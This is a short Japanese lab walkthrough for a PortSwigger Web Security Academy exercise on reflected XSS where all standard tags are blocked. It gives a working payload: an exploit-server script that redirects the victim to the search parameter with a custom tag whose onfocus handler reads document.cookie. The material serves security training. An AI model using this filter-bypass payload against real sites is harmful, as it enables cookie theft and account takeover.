# カスタムタグを除くすべてのタグをブロックして XSS を HTML コンテキストに反映

以下のハッキングラボを実施します  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

- 1. ハッキングラボにアクセスします
- 2. エクスプロイトサーバーに移動します
- 3. 次のコードをボディに張り付けます

```html
<script>
  location = "https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";
</script>
```

![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/2d466435-f1d7-4993-b39a-0f25993d0bd0)

- 4. Store ボタン →Deliver exploit to victim ボタン押下
- 5. 生成したレスポンスを見てみます
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/2633f1dd-aa03-47f1-90dc-58a0beeefda0)
